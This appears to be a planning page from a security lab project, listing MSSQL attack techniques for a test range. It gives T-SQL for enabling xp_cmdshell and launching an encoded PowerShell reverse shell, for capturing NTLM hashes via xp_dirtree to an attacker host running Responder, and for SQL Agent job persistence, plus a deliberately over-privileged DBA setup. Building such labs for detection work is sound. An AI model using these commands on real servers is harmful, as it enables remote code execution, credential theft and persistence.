---
title: MSSQL TTPs
layout: default
nav_order: 12
---

# MSSQL TTP Planning Notes
{: .no_toc }

Attack surface and planned scenarios for an MSSQL instance.

Fase 2 reference material. MSSQL is not part of the validated Fase 1 core SIEM ranges, and no VM has been assigned to host it yet — the previous plan combined it with a WEB/IIS server, which has been dropped from the roadmap (see [Vulnerabilities](vulnerabilities.md#notes)).
{: .label .label-yellow }

---

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Current State

| Item | Detail |
|---|---|
| Host | Not yet assigned — Windows Server 2022 |
| Services | MSSQL 2019, SSMS |
| Domain | `thruntops.domain` (member) |
| **Gap** | No VM assigned to host MSSQL |
| **Gap** | No DBA role / MSSQL users configured beyond SA |

---

## Planned: DBA Role

A `DBA` group will be created in each domain to provide controlled MSSQL access.

| Domain | User | MSSQL Role | Notes |
|---|---|---|---|
| `thruntops.domain` | `primary_user07` | `sysadmin` (SA-equivalent) | Can enable xp_cmdshell, create jobs, etc. |
| `secondary.thruntops.domain` | `secondary_user07` | `db_datareader` on one database | Read-only, no server-level permissions |

**Why this matters:**
- `primary_user07` is the high-value target — sysadmin access leads directly to OS-level RCE via xp_cmdshell
- `secondary_user07` demonstrates the privilege delta and makes impersonation / escalation within SQL meaningful

**Implementation needed:**
- `ludus_ad_content` role: create `DBA` group in both domains, add respective users
- MSSQL post-install: add domain group logins and assign server roles via T-SQL task (`ludus_mssql_config` role)
- A VM to host MSSQL

---

## MSSQL TTPs (standalone, credential-first)

These apply once MSSQL credentials are in hand — the exact initial-access vector depends on where MSSQL ends up being deployed.

### xp_cmdshell — OS Command Execution (T1059.003)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'powershell -enc <base64 reverse shell>';
```

Requires sysadmin. SA or `primary_user07` (planned DBA sysadmin) satisfies this.

---

### NTLM Hash Capture via xp_dirtree (T1557.001)

```sql
-- From any authenticated SQL session
EXEC xp_dirtree '\\10.2.50.250\share';
```

- Responder running on Kali (`10.2.50.250`) captures the NTLM hash of the SQL service account
- If SQL runs as `NETWORK SERVICE` → machine account hash → useful for relay (not cracking)
- If SQL runs as a domain service account → crack offline or relay

Requires only a valid SQL login — does not require sysadmin.

---

### SQL Agent Job — Persistence (T1053.002)

```sql
USE msdb;
EXEC sp_add_job @job_name = 'Maintenance';
EXEC sp_add_jobstep @job_name = 'Maintenance',
    @step_name = 'step1',
    @subsystem = 'CmdExec',
    @command = 'powershell -enc <payload>';
EXEC sp_add_schedule @schedule_name = 'daily', @freq_type = 4, @freq_interval = 1;
EXEC sp_attach_schedule @job_name = 'Maintenance', @schedule_name = 'daily';
EXEC sp_add_jobserver @job_name = 'Maintenance';
```

Requires sysadmin. Provides scheduled persistence on the SQL host.

**MITRE:** T1053.002

---

## Full Attack Chain

### domainadmin → RDP → MSSQL host → sysadmin

```
Compromise primary_user01 (shares domainadmin password)
  → RDP to the MSSQL host as domainadmin (in Remote Desktop Users)
  → SSMS: connect to local MSSQL as Windows auth → sysadmin
  → xp_cmdshell → persistence
```

---

## Implementation Checklist

**DBA role:**
- [x] Create `DBA` group in `thruntops.domain` and `secondary.thruntops.domain` (all three profiles)
- [x] Add `primary_user07` to DBA (thruntops), `secondary_user07` to DBA (secondary)
- [x] T-SQL: `thruntops\DBA` → sysadmin (`ludus_mssql_config` role)
- [x] T-SQL: `secondary\DBA` → db_datareader on ThruntOps DB (`ludus_mssql_config` role)

**MSSQL standalone TTPs:**
- [x] Document xp_cmdshell scenario in `docs/vulnerabilities.md`
- [x] Document NTLM capture via xp_dirtree in `docs/vulnerabilities.md`
- [x] Document DBA group → sysadmin escalation in `docs/vulnerabilities.md`
- [ ] Assign a VM to host MSSQL
- [ ] Verify end-to-end once a host is assigned
